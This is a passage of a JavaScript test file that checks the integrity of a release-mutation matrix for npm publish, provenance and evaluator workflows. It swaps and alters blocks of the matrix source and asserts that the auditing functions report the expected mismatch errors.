    expect(npmProvenanceEvaluatorCommandSourceStart).toBeGreaterThan(m143BlockStart);
    expect(m145BlockStart).toBeGreaterThan(npmProvenanceEvaluatorCommandSourceStart);
    expect(m144BlockStart).toBeGreaterThan(m145BlockStart);
    expect(m146BlockStart).toBeGreaterThan(m144BlockStart);
    expect(m147BlockStart).toBeGreaterThan(m146BlockStart);
    expect(m148BlockStart).toBeGreaterThan(m147BlockStart);
    expect(m149BlockStart).toBeGreaterThan(m148BlockStart);
    expect(m150BlockStart).toBeGreaterThan(m149BlockStart);
    expect(m151BlockStart).toBeGreaterThan(m150BlockStart);
    expect(m152BlockStart).toBeGreaterThan(m151BlockStart);
    expect(m153BlockStart).toBeGreaterThan(m152BlockStart);
    expect(m154BlockStart).toBeGreaterThan(m153BlockStart);
    expect(m155BlockStart).toBeGreaterThan(m154BlockStart);
    expect(m156BlockStart).toBeGreaterThan(m155BlockStart);
    expect(m157BlockStart).toBeGreaterThan(m156BlockStart);
    expect(m158BlockStart).toBeGreaterThan(m157BlockStart);
    expect(m159BlockStart).toBeGreaterThan(m158BlockStart);
    expect(m160BlockStart).toBeGreaterThan(m159BlockStart);
    expect(m161BlockStart).toBeGreaterThan(m160BlockStart);
    expect(m162BlockStart).toBeGreaterThan(m161BlockStart);
    expect(m163BlockStart).toBeGreaterThan(m162BlockStart);
    expect(m164BlockStart).toBeGreaterThan(m163BlockStart);
    expect(declarativeSealStart).toBeGreaterThan(m164BlockStart);
    const swappedRegistryDependencyDeclarations = [
      matrixSource.slice(0, m108BlockStart),
      matrixSource.slice(m107BlockStart, m109BlockStart),
      matrixSource.slice(m108BlockStart, m107BlockStart),
      matrixSource.slice(m109BlockStart)
    ].join("");
    const swappedNpmDeclarations = [
      swappedRegistryDependencyDeclarations.slice(0, m112BlockStart),
      swappedRegistryDependencyDeclarations.slice(m113BlockStart, declarativeSealStart),
      swappedRegistryDependencyDeclarations.slice(m112BlockStart, m113BlockStart),
      swappedRegistryDependencyDeclarations.slice(declarativeSealStart)
    ].join("");
    expect(historicalMutationProblems(swappedNpmDeclarations)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid declarative allowlist must be exact/),
        expect.stringMatching(/release mutation hybrid case allowlist must be exact/),
        expect.stringMatching(
          /release mutation hybrid registrations must be exact contiguous.*expected mutation:release\.m108, found mutation:release\.m107/
        )
      ])
    );

    const swappedNpmDependencyDeclarations = [
      matrixSource.slice(0, m140BlockStart),
      matrixSource.slice(m139BlockStart, declarativeSealStart),
      matrixSource.slice(m140BlockStart, m139BlockStart),
      matrixSource.slice(declarativeSealStart)
    ].join("");
    expect(historicalMutationProblems(swappedNpmDependencyDeclarations)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid declarative allowlist must be exact/),
        expect.stringMatching(
          /release mutation hybrid registrations must be exact contiguous.*expected mutation:release\.m140, found mutation:release\.m139/
        )
      ])
    );

    const swappedNpmEvaluatorDependencyDeclarations = [
      matrixSource.slice(0, m145BlockStart),
      matrixSource.slice(m144BlockStart, m146BlockStart),
      matrixSource.slice(m145BlockStart, m144BlockStart),
      matrixSource.slice(m146BlockStart)
    ].join("");
    expect(historicalMutationProblems(swappedNpmEvaluatorDependencyDeclarations)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid declarative allowlist must be exact/),
        expect.stringMatching(
          /release mutation hybrid registrations must be exact contiguous.*expected mutation:release\.m145, found mutation:release\.m144/
        )
      ])
    );

    // NEGATIVE controls: the nested dependency must remain a mutation-backed replacement,
    // and cannot be promoted to the root of m139's otherwise unchanged case.
    const m139NeedleLine = "      needle: NPM_PROVENANCE_AUDIT_COMMAND,";
    const m139ReplacementDependencyBlock = [m139NeedleLine, "      replacement: releaseMutationM140,"].join("\n");
    const sourceBackedM139Replacement = replaceExactly(
      matrixSource,
      m139ReplacementDependencyBlock,
      [m139NeedleLine, "      replacement: npmProvenanceAuditCommandSource,"].join("\n")
    );
    expect(historicalMutationProblems(sourceBackedM139Replacement)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m139 (?:must contain exact literal passive values|disagrees with its exact frozen semantics)/
        )
      ])
    );
    const conflatedM139DependencyRoot = replaceExactly(
      matrixSource,
      ['      id: "release.case.m139",', "      root: releaseMutationM139,"].join("\n"),
      ['      id: "release.case.m139",', "      root: releaseMutationM140,"].join("\n")
    );
    expect(historicalMutationProblems(conflatedM139DependencyRoot)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m139 disagrees with its exact frozen identity/
        )
      ])
    );

    // NEGATIVE controls: the evaluator dependency must remain a mutation-backed replacement,
    // and cannot be promoted to the root of m144's otherwise unchanged case.
    const m144NeedleLine = "      needle: NPM_PROVENANCE_EVALUATOR_COMMAND,";
    const m144ReplacementDependencyBlock = [m144NeedleLine, "      replacement: releaseMutationM145,"].join("\n");
    const sourceBackedM144Replacement = replaceExactly(
      matrixSource,
      m144ReplacementDependencyBlock,
      [m144NeedleLine, "      replacement: npmProvenanceEvaluatorCommandSource,"].join("\n")
    );
    expect(historicalMutationProblems(sourceBackedM144Replacement)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m144 (?:must contain exact literal passive values|disagrees with its exact frozen semantics)/
        )
      ])
    );
    const conflatedM144DependencyRoot = replaceExactly(
      matrixSource,
      ['      id: "release.case.m144",', "      root: releaseMutationM144,"].join("\n"),
      ['      id: "release.case.m144",', "      root: releaseMutationM145,"].join("\n")
    );
    expect(historicalMutationProblems(conflatedM144DependencyRoot)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m144 disagrees with its exact frozen identity/
        )
      ])
    );

    const m107SourceDependencyDrift = replaceExactly(
      matrixSource,
      "      source: releaseMutationM108,",
      "      source: registryPublishStepSource,"
    );
    const m140SourceHandleDrift = replaceExactly(
      m107SourceDependencyDrift,
      "      source: npmProvenanceAuditCommandSource,",
      "      source: releaseWorkflowFixtureSource,"
    );
    const m139ReplacementDependencyDrift = replaceExactly(
      m140SourceHandleDrift,
      m139ReplacementDependencyBlock,
      [m139NeedleLine, "      replacement: NPM_PROVENANCE_AUDIT_COMMAND,"].join("\n")
    );
    const m145SourceHandleDrift = replaceExactly(
      m139ReplacementDependencyDrift,
      "      source: npmProvenanceEvaluatorCommandSource,",
      "      source: releaseWorkflowFixtureSource,"
    );
    const m144ReplacementDependencyDrift = replaceExactly(
      m145SourceHandleDrift,
      m144ReplacementDependencyBlock,
      [m144NeedleLine, "      replacement: NPM_PROVENANCE_EVALUATOR_COMMAND,"].join("\n")
    );
    const m109CompanionDrift = replaceExactly(
      m144ReplacementDependencyDrift,
      [
        '            kind: "registry.step.run",',
        "            baseline: registryPublishStepSource,",
        "            mutant: releaseMutationM109,",
        "            integrity: releaseIntegritySource"
      ].join("\n"),
      [
        '            kind: "registry.step.run",',
        "            baseline: registryPublishStepSource,",
        "            mutant: releaseMutationM109,",
        "            integrity: registryPublishStepSource"
      ].join("\n")
    );
    const registryRunInvocationDrift = replaceExactly(
      m109CompanionDrift,
      [
        '            kind: "registry.step.run",',
        "            baseline: registryPublishStepSource,",
        "            mutant: releaseMutationM110,",
        "            integrity: releaseIntegritySource"
      ].join("\n"),
      [
        '            kind: "registry.step.run",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM110,",
        "            integrity: releaseIntegritySource"
      ].join("\n")
    );
    const registryInvocationDrift = replaceExactly(
      registryRunInvocationDrift,
      [
        '            kind: "registry.step.integrity",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM111,",
        "            run: registryPublishStepSource"
      ].join("\n"),
      [
        '            kind: "registry.step.integrity",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM111,",
        "            run: releaseIntegritySource"
      ].join("\n")
    );
    const npmReleaseInvocationDrift = replaceExactly(
      registryInvocationDrift,
      [
        '            kind: "npm.contract.release",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM112,",
        "            integrity: releaseIntegritySource"
      ].join("\n"),
      [
        '            kind: "npm.contract.release",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM112,",
        "            integrity: releaseWorkflowFixtureSource"
      ].join("\n")
    );
    const releaseOracleInvocationDrift = replaceExactly(
      npmReleaseInvocationDrift,
      [
        '            kind: "npm.contract.integrity",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM113,",
        "            release: releaseWorkflowFixtureSource"
      ].join("\n"),
      [
        '            kind: "npm.contract.integrity",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM113,",
        "            release: releaseIntegritySource"
      ].join("\n")
    );
    const npmWorkflowM114InvocationDrift = replaceExactly(
      releaseOracleInvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM114"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM114"
      ].join("\n")
    );
    const npmWorkflowM115InvocationDrift = replaceExactly(
      npmWorkflowM114InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM115"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM115"
      ].join("\n")
    );
    const npmWorkflowM116InvocationDrift = replaceExactly(
      npmWorkflowM115InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM116"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM116"
      ].join("\n")
    );
    const npmWorkflowM117InvocationDrift = replaceExactly(
      npmWorkflowM116InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM117"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM117"
      ].join("\n")
    );
    const npmWorkflowM118InvocationDrift = replaceExactly(
      npmWorkflowM117InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM118"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM118"
      ].join("\n")
    );
    const npmWorkflowM119InvocationDrift = replaceExactly(
      npmWorkflowM118InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM119"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM119"
      ].join("\n")
    );
    const npmWorkflowM120InvocationDrift = replaceExactly(
      npmWorkflowM119InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM120"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM120"
      ].join("\n")
    );
    const npmWorkflowM121InvocationDrift = replaceExactly(
      npmWorkflowM120InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM121"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM121"
      ].join("\n")
    );
    const npmWorkflowM122InvocationDrift = replaceExactly(
      npmWorkflowM121InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM122"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM122"
      ].join("\n")
    );
    const npmWorkflowM123InvocationDrift = replaceExactly(
      npmWorkflowM122InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM123"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM123"
      ].join("\n")
    );
    const npmWorkflowM124InvocationDrift = replaceExactly(
      npmWorkflowM123InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM124"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM124"
      ].join("\n")
    );
    const npmWorkflowM125InvocationDrift = replaceExactly(
      npmWorkflowM124InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM125"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM125"
      ].join("\n")
    );
    const npmWorkflowM126InvocationDrift = replaceExactly(
      npmWorkflowM125InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM126"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM126"
      ].join("\n")
    );
    const npmWorkflowM127InvocationDrift = replaceExactly(
      npmWorkflowM126InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM127"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM127"
      ].join("\n")
    );
    const npmWorkflowM128InvocationDrift = replaceExactly(
      npmWorkflowM127InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM128"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM128"
      ].join("\n")
    );
    const npmWorkflowM129InvocationDrift = replaceExactly(
      npmWorkflowM128InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM129"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM129"
      ].join("\n")
    );
    const npmWorkflowM130InvocationDrift = replaceExactly(
      npmWorkflowM129InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM130"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM130"
      ].join("\n")
    );
    const npmWorkflowM131InvocationDrift = replaceExactly(
      npmWorkflowM130InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM131"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM131"
      ].join("\n")
    );
    const npmWorkflowM132InvocationDrift = replaceExactly(
      npmWorkflowM131InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM132"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM132"
      ].join("\n")
    );
    const npmWorkflowM133InvocationDrift = replaceExactly(
      npmWorkflowM132InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM133"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM133"
      ].join("\n")
    );
    const npmWorkflowM134InvocationDrift = replaceExactly(
      npmWorkflowM133InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM134"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM134"
      ].join("\n")
    );
    const npmWorkflowM135InvocationDrift = replaceExactly(
      npmWorkflowM134InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM135"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM135"
      ].join("\n")
    );
    const npmWorkflowM136InvocationDrift = replaceExactly(
      npmWorkflowM135InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM136"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM136"
      ].join("\n")
    );
    const npmWorkflowM137InvocationDrift = replaceExactly(
      npmWorkflowM136InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM137"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM137"
      ].join("\n")
    );
    const npmWorkflowM138InvocationDrift = replaceExactly(
      npmWorkflowM137InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM138"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM138"
      ].join("\n")
    );
    const npmWorkflowM139InvocationDrift = replaceExactly(
      npmWorkflowM138InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM139"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM139"
      ].join("\n")
    );
    const npmWorkflowM141InvocationDrift = replaceExactly(
      npmWorkflowM139InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM141"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM141"
      ].join("\n")
    );
    const npmWorkflowM142InvocationDrift = replaceExactly(
      npmWorkflowM141InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM142"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM142"
      ].join("\n")
    );
    const npmWorkflowM143InvocationDrift = replaceExactly(
      npmWorkflowM142InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM143"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM143"
      ].join("\n")
    );
    const npmWorkflowM144InvocationDrift = replaceExactly(
      npmWorkflowM143InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM144"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM144"
      ].join("\n")
    );
    const npmWorkflowM146InvocationDrift = replaceExactly(
      npmWorkflowM144InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM146"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM146"
      ].join("\n")
    );
    const npmWorkflowM147InvocationDrift = replaceExactly(
      npmWorkflowM146InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM147"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM147"
      ].join("\n")
    );
    const npmWorkflowM148InvocationDrift = replaceExactly(
      npmWorkflowM147InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM148"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM148"
      ].join("\n")
    );
    const npmWorkflowM149InvocationDrift = replaceExactly(
      npmWorkflowM148InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM149"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM149"
      ].join("\n")
    );
    const npmWorkflowM150InvocationDrift = replaceExactly(
      npmWorkflowM149InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM150"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM150"
      ].join("\n")
    );
    const npmWorkflowM151InvocationDrift = replaceExactly(
      npmWorkflowM150InvocationDrift,
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM151"
      ].join("\n"),
      [
        '            kind: "npm.workflow",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM151"
      ].join("\n")
    );
    const npmEvaluatorM152InvocationDrift = replaceExactly(
      npmWorkflowM151InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM152"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM152"
      ].join("\n")
    );
    const npmEvaluatorM153InvocationDrift = replaceExactly(
      npmEvaluatorM152InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM153"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM153"
      ].join("\n")
    );
    const npmEvaluatorM154InvocationDrift = replaceExactly(
      npmEvaluatorM153InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM154"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM154"
      ].join("\n")
    );
    const npmEvaluatorM155InvocationDrift = replaceExactly(
      npmEvaluatorM154InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM155"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM155"
      ].join("\n")
    );
    const npmEvaluatorM156InvocationDrift = replaceExactly(
      npmEvaluatorM155InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM156"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM156"
      ].join("\n")
    );
    const npmEvaluatorM157InvocationDrift = replaceExactly(
      npmEvaluatorM156InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM157"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM157"
      ].join("\n")
    );
    const npmEvaluatorM158InvocationDrift = replaceExactly(
      npmEvaluatorM157InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM158"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM158"
      ].join("\n")
    );
    const npmEvaluatorM159InvocationDrift = replaceExactly(
      npmEvaluatorM158InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM159"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM159"
      ].join("\n")
    );
    const npmEvaluatorM160InvocationDrift = replaceExactly(
      npmEvaluatorM159InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM160"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM160"
      ].join("\n")
    );
    const npmEvaluatorM161InvocationDrift = replaceExactly(
      npmEvaluatorM160InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM161"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM161"
      ].join("\n")
    );
    const npmEvaluatorM162InvocationDrift = replaceExactly(
      npmEvaluatorM161InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM162"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM162"
      ].join("\n")
    );
    const npmEvaluatorM163InvocationDrift = replaceExactly(
      npmEvaluatorM162InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM163"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM163"
      ].join("\n")
    );
    const npmEvaluatorM164InvocationDrift = replaceExactly(
      npmEvaluatorM163InvocationDrift,
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM164"
      ].join("\n"),
      [
        '            kind: "npm.evaluator",',
        "            baseline: releaseWorkflowFixtureSource,",
        "            mutant: releaseMutationM164"
      ].join("\n")
    );
    const npmWorkflowM151WitnessDrift = replaceExactly(
      matrixSource,
      ["        anchor: MCPB_EXACT_NPM_PUBLISH.slice(0, 512),", "        before: 1,", "        after: 2"].join("\n"),
      ["        anchor: MCPB_EXACT_NPM_PUBLISH.slice(0, 512),", "        before: 0,", "        after: 2"].join("\n")
    );
    expect(
      releaseMutationVersionedTransitionAuditProblems(npmWorkflowM151WitnessDrift, fixtureBefore, transitionAuthority)
    ).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation transition current matrix source witness mismatch/),
        expect.stringMatching(/release mutation transition current matrix slice witness mismatch/),
        expect.stringMatching(/current successor release\.m636 disagrees with its reviewed target witnesses/),
        expect.stringMatching(
          /current declarative identity release\.m636 witness disagrees with independently derived semantics/
        )
      ])
    );
    const npmWorkflowInvocationDrift = npmEvaluatorM164InvocationDrift;
    expect(historicalMutationProblems(npmWorkflowInvocationDrift)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m107 disagrees with its exact frozen semantics/
        ),
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m140 disagrees with its exact frozen semantics/
        ),
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m139 must contain exact literal passive values/
        ),
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m145 disagrees with its exact frozen semantics/
        ),
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m144 must contain exact literal passive values/
        ),
        expect.stringMatching(/release mutation hybrid case release\.case\.m109 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m110 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m111 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m112 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m113 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m114 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m115 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m116 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m117 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m118 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m119 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m120 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m121 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m122 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m123 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m124 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m125 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m126 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m127 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m128 invocation must retain its exact/),
